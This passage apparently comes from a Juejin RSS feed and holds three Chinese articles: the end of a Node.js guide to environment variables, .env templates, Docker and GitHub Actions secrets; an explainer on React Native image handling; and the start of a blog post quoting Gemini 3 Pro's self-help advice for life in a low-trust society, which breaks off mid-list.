<p>只提交一个 <code>.env.example</code> 作为模板：</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># .env.example - Copy this to .env and fill in your values</span>
<span class="hljs-attr">PORT</span>=<span class="hljs-number">3000</span>
<span class="hljs-attr">NODE_ENV</span>=development
<span class="hljs-attr">DB_HOST</span>=localhost
<span class="hljs-attr">DB_PORT</span>=<span class="hljs-number">3306</span>
<span class="hljs-attr">DB_USER</span>=
<span class="hljs-attr">DB_PASSWORD</span>=
<span class="hljs-attr">DB_NAME</span>=
<span class="hljs-attr">API_KEY</span>=
AI写代码
</code></pre>
<p>新成员只需复制 <code>.env.example</code> 为 <code>.env</code> 并填写自己的值。</p>
<h4 data-id="heading-14"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>2. 生产环境：永远不要依赖 <code>.env</code> 文件</h4>
<p>在生产服务器上，<strong>不要</strong>使用 <code>.env</code> 文件。应该通过以下方式设置环境变量：</p>
<ul>
<li>
<p><strong>操作系统级：</strong> 在服务器的 <code>~/.bashrc</code>, <code>/etc/environment</code> 中设置。</p>
</li>
<li>
<p><strong>容器化 (Docker)：</strong> 在 <code>docker run</code> 命令或 <code>docker-compose.yml</code> 中使用 <code>environment</code> 字段。</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># docker-compose.yml</span>
services:
  app:
    image: myapp:latest
    environment:
      - <span class="hljs-attr">NODE_ENV</span>=production
      - <span class="hljs-attr">PORT</span>=<span class="hljs-number">8080</span>
      - <span class="hljs-attr">DB_HOST</span>=prod-db
      - <span class="hljs-attr">DB_PASSWORD</span>=<span class="hljs-variable">${DB_PASSWORD}</span> <span class="hljs-comment"># 从主机环境或Secret读取</span>
AI写代码
</code></pre>
</li>
<li>
<p><strong>PaaS平台 (如Heroku, Vercel)：</strong> 在平台的控制台中设置环境变量。</p>
</li>
<li>
<p><strong>CI/CD管道：</strong> 在Jenkins、GitHub Actions等工具中配置Secrets。</p>
</li>
</ul>
<h4 data-id="heading-15"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>3. 使用 <code>cross-env</code> 解决跨平台兼容性</h4>
<p>如果你在Windows和Linux/macOS上开发，<code>cross-env</code> 可以让你用统一的命令设置环境变量。</p>
<pre><code class="hljs language-lua" lang="lua">npm install <span class="hljs-comment">--save-dev cross-env</span>
 
# <span class="hljs-built_in">package</span>.json
{
  <span class="hljs-string">"scripts"</span>: {
    <span class="hljs-string">"dev"</span>: <span class="hljs-string">"cross-env NODE_ENV=development node app.js"</span>,
    <span class="hljs-string">"start"</span>: <span class="hljs-string">"cross-env NODE_ENV=production node app.js"</span>
  }
}
AI写代码
</code></pre>
<h4 data-id="heading-16"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>4. 避免在客户端暴露敏感信息</h4>
<p>如果使用Next.js、Nuxt.js等同构框架，注意：</p>
<ul>
<li>以 <code>NEXT_PUBLIC_</code> 开头的环境变量会被暴露到前端。</li>
<li>敏感信息（如数据库密码、API密钥）<strong>绝不能</strong>以 <code>NEXT_PUBLIC_</code> 开头。</li>
</ul>
<hr/>
<h3 data-id="heading-17"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>五、 高级技巧：动态配置与CI/CD集成</h3>
<h4 data-id="heading-18"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>1. 动态加载配置</h4>
<p>有时配置需要根据运行时条件动态生成：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// config/index.js</span>
<span class="hljs-comment">// ...</span>
<span class="hljs-keyword">this</span>.redisUrl = <span class="hljs-keyword">this</span>.isProduction 
    ? `redis:<span class="hljs-comment">//:${process.env.REDIS_PASSWORD}@prod-redis:6379` </span>
    : <span class="hljs-string">'redis://localhost:6379'</span>;
<span class="hljs-comment">// ...</span>
AI写代码
</code></pre>
<h4 data-id="heading-19"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>2. CI/CD中的环境变量</h4>
<p>在GitHub Actions中使用Secrets：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># .github/workflows/deploy.yml</span>
<span class="hljs-attr">jobs:</span>
  <span class="hljs-attr">deploy:</span>
    <span class="hljs-attr">steps:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Set</span> <span class="hljs-string">up</span> <span class="hljs-string">Node.js</span>
        <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/setup-node@v3</span>
        <span class="hljs-attr">with:</span>
          <span class="hljs-attr">node-version:</span> <span class="hljs-string">'18'</span>
      
      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Install</span> <span class="hljs-string">dependencies</span>
        <span class="hljs-attr">run:</span> <span class="hljs-string">npm</span> <span class="hljs-string">ci</span>
      
      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Run</span> <span class="hljs-string">tests</span>
        <span class="hljs-attr">env:</span>
          <span class="hljs-attr">NODE_ENV:</span> <span class="hljs-string">test</span>
          <span class="hljs-attr">DB_PASSWORD:</span> <span class="hljs-string">${{</span> <span class="hljs-string">secrets.DB_TEST_PASSWORD</span> <span class="hljs-string">}}</span>
        <span class="hljs-attr">run:</span> <span class="hljs-string">npm</span> <span class="hljs-string">test</span>
      
      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Deploy</span> <span class="hljs-string">to</span> <span class="hljs-string">Production</span>
        <span class="hljs-attr">if:</span> <span class="hljs-string">github.ref</span> <span class="hljs-string">==</span> <span class="hljs-string">'refs/heads/main'</span>
        <span class="hljs-attr">run:</span> <span class="hljs-string">|
          # 部署命令，使用生产环境变量
          NODE_ENV=production DB_PASSWORD=${{ secrets.DB_PROD_PASSWORD }} npm run deploy
</span>        <span class="hljs-attr">env:</span>
          <span class="hljs-attr">DB_PASSWORD:</span> <span class="hljs-string">${{</span> <span class="hljs-string">secrets.DB_PROD_PASSWORD</span> <span class="hljs-string">}}</span>
<span class="hljs-string">AI写代码</span>
</code></pre>
<hr/>
<h3 data-id="heading-20"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>六、 总结</h3>
<p>通过本文的系统学习，你应该已经掌握了Node.js环境变量配置的核心技能：</p>
<ol>
<li><strong>基础：</strong> 理解 <code>process.env</code> 和命令行设置。</li>
<li><strong>核心：</strong> 使用 <code>dotenv</code> 库和 <code>.env</code> 文件实现配置文件化。</li>
<li><strong>进阶：</strong> 创建健壮的配置模块，实现集中管理与验证。</li>
<li><strong>安全：</strong> 通过 <code>.gitignore</code> 保护敏感信息，生产环境使用系统级变量。</li>
<li><strong>实践：</strong> 将环境变量无缝集成到Docker、CI/CD等现代开发流程中。</li>
</ol>
<p><strong>记住：</strong>  良好的配置管理是构建专业、可维护、安全的Node.js应用的基石。不要再让硬编码的密码和混乱的配置拖慢你的开发效率了！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[React Native 图片机制深度解析：设计哲学、性能优化与避坑指南]]></title>    <link>https://juejin.cn/post/7581786379804409891</link>    <guid>https://juejin.cn/post/7581786379804409891</guid>    <pubDate>2025-12-10T06:02:12.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581786379804409891" data-draft-id="7581786379804377123" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="React Native 图片机制深度解析：设计哲学、性能优化与避坑指南"/> <meta itemprop="keywords" content="前端,React Native"/> <meta itemprop="datePublished" content="2025-12-10T06:02:12.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="皮蛋小精灵"/> <meta itemprop="url" content="https://juejin.cn/user/219558056559278"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            React Native 图片机制深度解析：设计哲学、性能优化与避坑指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/219558056559278/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    皮蛋小精灵
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T06:02:12.000Z" title="Wed Dec 10 2025 06:02:12 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">1. 核心哲学：体验优先于便利 (UX &gt; DX)</h3>
<p>React Native 在图片处理上与 Web 浏览器有着本质的不同。RN 宁愿让开发者多写一点代码，也要保证用户体验的极致顺滑。</p>
<ul>
<li>
<p><strong>拒绝“布局抖动” (No Layout Shift)：</strong></p>
<ul>
<li><strong>Web 痛点：</strong> 浏览器加载图片时默认是 0x0，下载完瞬间撑开，导致页面跳动。</li>
<li><strong>RN 策略：</strong> 强制要求开发者预先指定远程图片的宽高。这意味着图片加载前位置就已留好，加载后只是填空，界面纹丝不动。</li>
</ul>
</li>
<li>
<p><strong>例外：</strong> 本地静态图片（<code>require('./icon.png')</code>）因在编译时已知尺寸，可自动推断宽高。</p>
</li>
</ul>
<h3 data-id="heading-1">2. 底层性能：为了不卡顿 (Performance)</h3>
<p>RN 在幕后做了大量工作，确保即使加载高清大图，App 的 UI 线程（Main Thread）也不会阻塞。</p>
<ul>
<li>
<p><strong>后台解码 (Off-thread Decoding)：</strong></p>
<ul>
<li>图片解码（JPEG/PNG转像素）非常耗时。RN 将其移至后台线程执行，解码完成后再送回主线程显示。这避免了 Web 常见的“滚动时因加载图片导致的掉帧”。</li>
</ul>
</li>
<li>
<p><strong>iOS 智能选图 (The 50% Rule)：</strong></p>
<ul>
<li>从相册加载图片时，RN 不会无脑加载原图（太费内存），也不会选太小的图（太糊）。</li>
<li>它会自动寻找第一张<strong>比显示区域大 50% 以上</strong>的缩略图版本。既保证了清晰度（避免拉伸模糊），又最大程度节省了内存。</li>
</ul>
</li>
</ul>
<h3 data-id="heading-2">3. 架构设计：面向未来的扩展性 (Extensibility)</h3>
<ul>
<li>
<p><strong>Source 是对象而非字符串：</strong></p>
<ul>
<li><code>&lt;Image source={{uri: '...'}} /&gt;</code> 的设计看似繁琐，实则为了扩展。</li>
<li>它允许携带元数据（Metadata），并为未来特性（如雪碧图裁剪 <code>crop</code> 属性）预留了接口，保证了代码的向后兼容性。</li>
</ul>
</li>
</ul>
<h3 data-id="heading-3">4. iOS 实战：避坑与进阶调优 (iOS Specifics)</h3>
<p>针对 iOS 平台，有一些特殊的限制和高级配置需要注意：</p>
<ul>
<li>
<p><strong>圆角样式的坑：</strong></p>
<ul>
<li><strong>问题：</strong> <code>borderTopLeftRadius</code> 等单独圆角属性在 iOS <code>&lt;Image&gt;</code> 上往往不生效。</li>
<li><strong>解法：</strong> 使用“外部裁剪法”。将 Image 包裹在 <code>&lt;View&gt;</code> 中，在 View 上设置圆角并加上 <code>overflow: 'hidden'</code>。</li>
</ul>
</li>
<li>
<p><strong>手动控制缓存 (Cache Limits)：</strong></p>
<ul>
<li><strong>能力：</strong> 可以在 <code>AppDelegate.m</code> 中调用 <code>RCTSetImageCacheLimits</code>。</li>
<li><strong>参数：</strong> 可以设定“单张图片最大体积”（超过不缓存）和“总缓存池上限”（超过踢掉旧图），从而在内存紧张或图片密集的 App 中找到性能平衡点。</li>
</ul>
</li>
</ul>
<hr/>
<h3 data-id="heading-4">总结</h3>
<p>React Native 的 Image 组件不仅仅是一个简单的 UI 元素，它是一个<strong>高度封装的、自带性能优化策略的子系统</strong>。理解这些机制，能帮你写出即便在数千张图片的瀑布流中依然如丝般顺滑的 App。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[低信任度社会的普世价值观]]></title>    <link>https://juejin.cn/post/7581769891499229203</link>    <guid>https://juejin.cn/post/7581769891499229203</guid>    <pubDate>2025-12-10T03:52:42.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581769891499229203" data-draft-id="7581752508780380203" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="低信任度社会的普世价值观"/> <meta itemprop="keywords" content="程序员"/> <meta itemprop="datePublished" content="2025-12-10T03:52:42.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="小兵张健"/> <meta itemprop="url" content="https://juejin.cn/user/1257497032405229"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            低信任度社会的普世价值观
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1257497032405229/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    小兵张健
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T03:52:42.000Z" title="Wed Dec 10 2025 03:52:42 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>我对纳瓦尔访谈中 self-esteem 和社会信任度的没有理解透。于是和 Gemini 3 Pro 做了一次对话，随着问题的深入 AI 的一些观点让我头皮发麻，赶紧记录下来。</p>
<hr/>
<p>先说让我震惊的 Gemini 3 Pro 给的普世价值观：</p>
<p>我最后问的是：<br/>
我只是一个普通的中国人，在这样的社会里，你还有哪些普世的建议？可以发散性思考下，针对中国这样特定的行情</p>
<p>Gemini 3 Pro的回答：</p>
<p>这是一个非常扎心但也充满希望的话题。作为一个“普通的中国人”身处当下，不仅仅是与人博弈，更是与<strong>时代的不确定性</strong>和<strong>集体焦虑</strong>博弈。</p>
<p>在低信任度、高内卷（Involution）、且信息噪音极大的环境中，你需要一套**“反脆弱”**的个人操作系统。</p>
<p>我不讲大道理，我们讲<strong>生存策略</strong>。结合纳瓦尔的智慧和中国当下的现实，我有以下 6 条发散性的“普世建议”：</p>
<h3 data-id="heading-0">1. 进行“信息源”的供给侧改革 (Information Arbitrage)</h3>
<p>在中国，最大的不平等不是财富，而是<strong>信息</strong>。 大多数人每天被算法投喂（抖音、微博热搜），情绪被营销号反复收割，处于“信息茧房”中。</p>
<ul>
<li>
<p><strong>建议：</strong> 建立你的**“信息套利”**优势。</p>
<ul>
<li><strong>必须掌握英语：</strong> 不为了考试，而是为了能直接阅读一手信息（OpenAI 的文档、纳瓦尔的博客、国外的优质教程）。中文互联网上的很多高价课，往往只是把免费的英文信息搬运并翻译了一下。打破这层屏障，你就领先了 90% 的人。</li>
<li><strong>屏蔽噪音：</strong> 卸载或者极度克制使用短视频软件。那些是为了消耗你的时间（Time-sink）设计的。你的注意力是你最值钱的资产，别免费送给平台。</li>
<li><strong>寻找“源头”：</strong> 不看“XX解读”，直接去看原书、原财报、原政策文件。</li>
</ul>
</li>
</ul>
<h3 data-id="heading-1">2. 这里的“面子”是最昂贵的税 (The "Face" Tax)</h3>
<p>中国社会有一种隐形的“面子税”。为了合群、为了不被亲戚看不起，普通人背负了沉重的房贷、车贷，办奢华的婚礼。</p>
<ul>
<li>
<p><strong>建议：</strong> 实行**“战略性不要脸”**。</p>
<ul>
<li><strong>纳瓦尔视角：</strong> 这种 Status Game（地位游戏）是零和博弈。你赢了面子，输了里子（现金流和自由）。</li>
<li><strong>实操：</strong> 把“别人怎么看我”这个关注点彻底关掉。</li>
<li>如果你不买超越阶级的车，不为了面子背 30 年房贷，你的<strong>抗风险能力</strong>会瞬间爆表。在低信任、经济波动的周期里，<strong>现金流（Cash Flow）和无债一身轻</strong>，就是最大的底气（F-you Money）。</li>
</ul>
</li>
</ul>
<h3 data-id="heading-2">3. 把“身体”当作唯一的固定资产 (Biological Capital)</h3>
<p>在一个“内卷”社会，大家都在透支身体换金钱。但这里的医疗成本和护理成本极高，且生病后的社会支持系统相对脆弱。</p>
<ul>
<li>
<p><strong>建议：</strong> 做一个**“健康极端主义者”**。</p>
<ul>
<li>把睡眠和运动当作“工作任务”来排期，而不是空闲了才做。</li>
<li><strong>逻辑：</strong> 你的身体是你唯一的、不可剥夺的资产。当别人在 996 拼命时，你哪怕只是苟住，保持健康，活得久一点，你就已经跑赢了很多人。</li>
<li><strong>拒绝成瘾性解压：</strong> 烟、酒、糖、熬夜刷剧。这些是低信任社会给普通人提供的廉价麻醉剂，目的是让你对现状麻木。清醒地活着是一种反抗。</li>
</ul>
</li>
</ul>
<h3 data-id="heading-3">4. 建立“原子化家庭”的诺亚方舟 (The Micro-Trust Unit)</h3>
<p>虽然社会信任度低，但中国家庭内部的韧性极强。然而，很多普通人的精力都消耗在“家庭内耗”上（婆媳矛盾、催婚、亲戚攀比）。</p>
<ul>
<li>
<p><strong>建议：</strong> <strong>由大宗族逻辑转向“核心盟友”逻辑。</strong></p>
<ul>
<li><strong>清理亲戚链：</strong> 那些只会在过年时打压你、嘲讽你、借钱不还的亲戚，断绝精神往来。</li>
<li><strong>经营核心伴侣/父母：</strong> 既然外面风浪大，你的小家就是“诺亚方舟”。对你的伴侣和孩子保持<strong>极高的信任度和宽容度</strong>。在外面戴着面具防御，回家必须能卸下面具。</li>
<li>不要把在职场受的气撒在家人身上，这是普通人最容易犯的战略错误——<strong>伤害你唯一的盟友。</strong></li>
</ul>
</li>
</ul>
<h3 data-id="heading-4">5. 成为“解决问题的人”，而不是“搞关系的人” (Competence over Guanxi)</h3>
<p>很多人认为在中国混必须靠“关系”。确实，关系有用，但对于<strong>普通人</strong>来说，维护关系的成本极高（送礼、喝酒、陪笑），且非常脆弱（人走茶凉）。</p>
<ul>
<li>
<p><strong>建议：</strong> 走**“手艺人”**路线。</p>
<ul>
<li>在低信任社会，**“靠谱”**本身就是一种稀缺资源。</li>
<li>无论你是修水管的、写代码的、还是做设计的，如果你能<strong>按时交付、质量稳定、不找借口</strong>，你的口碑会像野火一样传播。</li>
